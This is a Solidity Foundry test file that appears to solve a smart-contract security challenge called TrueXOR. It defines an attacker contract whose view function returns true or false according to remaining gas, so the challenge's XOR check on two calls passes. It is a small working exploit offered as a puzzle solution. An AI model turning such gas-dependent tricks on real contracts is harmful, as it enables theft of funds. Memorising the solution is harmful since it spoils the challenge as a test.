// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/7.sol";


contract AttackTrueXOR is IBoolGiver {
	function giveBool() external view returns (bool) {
		uint consume_3wei_gas;
		
		if (gasleft() % 2 == 1) {
			return true;
		} else {
			return false;
		}
	}
}

contract Test7 is Test {

    TrueXOR txor;
	AttackTrueXOR atkxor;

	function setUp() public {
        txor = new TrueXOR();
		atkxor = new AttackTrueXOR();
	}
	function testCallMe() public {
		vm.prank(tx.origin);
        assertEq(txor.callMe{gas:1000000}(address(atkxor)), true);
	}
}
